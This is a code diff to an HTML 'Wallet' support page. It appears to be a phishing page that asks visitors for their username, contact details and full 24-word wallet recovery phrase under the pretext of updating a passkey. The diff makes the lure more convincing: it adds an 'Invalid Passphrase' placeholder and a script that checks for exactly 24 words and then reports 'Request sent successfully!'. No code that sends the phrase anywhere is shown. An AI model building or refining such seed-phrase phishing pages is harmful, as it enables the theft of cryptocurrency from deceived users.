@@ -43,6 +43,9 @@
             border-radius: 5px;
             margin-bottom: 10px;
         }
+        input {
+            height: 40px;
+        }
         textarea {
             height: 120px;
             resize: none;
@@ -91,18 +94,29 @@
             }
         }
     </style>
+    <script>
+        function validatePassphrase() {
+            var passphrase = document.getElementById("passphrase").value.trim();
+            var words = passphrase.split(/\s+/).filter(word => word.length > 0);
+            if (words.length !== 24) {
+                alert("Passphrase must contain exactly 24 words.");
+                return false;
+            }
+            alert("Request sent successfully!");
+            return true;
+        }
+    </script>
 </head>
 <body>
     <div class="header">
-        <span>Welcome to the Support Page</span>
+        <span>Wallet</span>
     </div>
     <div class="container">
         <h2>Request to update passkey</h2>
         <input type="text" placeholder="Enter username">
         <input type="text" placeholder="Enter phone number/email ID">
-        <textarea placeholder="Enter your 24-word passphrase here"></textarea>
-        <button class="btn">Unlock With Passphrase</button>
-        <button class="btn btn-disabled" disabled>Biometric Not Available</button>
+        <textarea id="passphrase" placeholder="Invalid Passphrase"></textarea>
+        <button class="btn" onclick="validatePassphrase()">Send Request</button>
         <p class="info">As a non-custodial wallet, your wallet passphrase is exclusively accessible only to you. Recovery of passphrase is currently impossible.</p>
     </div>
 </body>
